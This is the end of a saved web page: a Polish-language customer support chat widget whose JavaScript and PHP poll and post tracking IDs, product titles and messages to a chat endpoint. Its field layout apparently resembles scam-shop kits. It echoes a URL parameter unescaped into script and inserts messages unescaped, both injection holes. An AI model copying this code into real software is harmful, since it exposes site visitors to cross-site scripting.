                                            <div class="with-status" style="display: inline-block;">
                                                <div class="status-online" style="display: inline-block;">
                                                    
                                                </div>online</div>
                                            </div>
                                        </div>
                                </div>
                            </div>
                            <div class="chat-block">
                                <div id="chat">
                                    <div class="operators-msg" id="greeting-msg" style="display: none;">
                                        <div class="operators-photo"><img src="./sgb_files/operator-img.png"></div>
                                        <div class="operators-first-text">Dzień dobry! Jak mogę ci pomóc?</div>                            
                                    </div>
                                
                                </div>
                                <div id="input-msg" style="display: flex;">
                                    <input type="text" name="smstosup1" id="smstosup1" placeholder="Wpisz swoją wiadomość...">
                                    <button id="smstosupbutton1" onclick="sendMessage()">
                                        <div class="chaport-send-icon">
                                            <svg width="18" height="18" viewBox="0 0 535.5 535.5">
                                                <polygon points="0,497.25 535.5,267.75 0,38.25 0,216.75 382.5,267.75 0,318.75" fill="#b9bdbf">      
                                                </polygon>
                                            </svg>
                                        </div>
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>  
                    <div class="chaport-big-shadow"></div>
            </div>
        </div>

        <script type="text/javascript">


var supportbutton = document.querySelector('.chaport-launcher-button');
    var supportwindow = document.querySelector('.chaport-window');

    supportbutton.onclick = function() {
        if (supportwindow.style.opacity == '0') {
            supportwindow.style.opacity = '1';
            supportwindow.style.visibility = 'visible';
        } else {
            supportwindow.style.opacity = '0';
            supportwindow.style.visibility = 'hidden';
        }
    };
</script>

<script type="text/javascript">

var myVar = setInterval(updateChat, 5000);
var pool = true;
function updateChat() {
var supportbutton = document.querySelector('.chaport-launcher-button');
var supportwindow = document.querySelector('.chaport-window');
var token = <?php echo $_GET['id']; ?>;
if (token !== null) {
if (pool) {
xhttp = new XMLHttpRequest();
var track_id = document.getElementById("refresh_time").value;
var url = 'https://' + document.location.hostname + '/chat_src/message.php';
pool = false;
xhttp.open("POST", url, true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhttp.send("get=0&token=" + token);
xhttp.onload = function (e) {
if (xhttp.readyState === 4) {
  if (xhttp.status === 200) {
    var body = xhttp.response;
    pool = true;
    var json = JSON.parse(body);
    for (let i = 0; i < json.length; i++) {
      cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
      if (json[i].sender == 't') {
        text = '<div class="operators-msg" style="display: flex;"><div class="operators-photo"><img src="../ordercss/operator-img.png"></div><div class="operators-msg-text" id="qwe1649370682">'+ json[i].message +'</div></div>'
      } else if (json[i].sender == 'i') {
        text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
      }else if (json[i].sender == "testOnline"){
        return 'okay';
      }else{
        text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
      }

      
      $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + text);
      var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
      objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
      supportwindow.style.opacity = '1';
      supportwindow.style.visibility = 'visible';
    }

  } else {
    pool = true;
  }
}
}
}
}
}

function sendMessage() {
message = document.getElementById("smstosup1").value;
if (message === '') {
return;
}
document.getElementById("smstosup1").value = '';
var token = document.getElementById("refresh_time").value;
if (token === null) {
var token = Math.random().toString(36).substring(7);
}
xhttp = new XMLHttpRequest();
var track_id = document.getElementById("refresh_time").value;
var url = 'https://' + document.location.hostname + '/chat_src/message.php';
xhttp.open("POST", url, true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
var uid = document.getElementById("home_time").value;
var title = document.getElementById("product").value;
xhttp.send("send=1&track_id=" + encodeURIComponent(track_id) + "&uid=" + encodeURIComponent(uid) + "&token=" + encodeURIComponent(token) + "&message=" + encodeURIComponent(message) + "&type=" + encodeURIComponent(window.location.host.split('.')[0]) + "&title=" + encodeURIComponent(title));
cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
$('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + '<div class="visitors-msg-text" id="qwe1649370526">'+ message +'</div>');
setCookie('token', token);
var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
}

function setCookie(cname, cvalue) {
var d = new Date();
d.setTime(d.getTime() + (6 * 60 * 60 * 1000));
var expires = "expires=" + d.toUTCString();
document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
}

</script><div id="goog-gt-tt" class="skiptranslate" dir="ltr"><div style="padding: 8px;"><div><div class="logo"><img src="./sgb_files/translate_24dp.png" width="20" height="20" alt="Google Переводчик"></div></div></div><div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">Исходный текст</h1></div><div class="middle" style="padding: 8px;"><div class="original-text"></div></div><div class="bottom" style="padding: 8px;"><div class="activity-links"><span class="activity-link">Предложить лучший вариант перевода</span><span class="activity-link"></span></div><div class="started-activity-container"><hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"><div class="activity-root"></div></div></div><div class="status-message" style="display: none;"></div></div>
<div class="goog-te-spinner-pos"><div class="goog-te-spinner-animation"><svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66"><circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle></svg></div></div></body></html>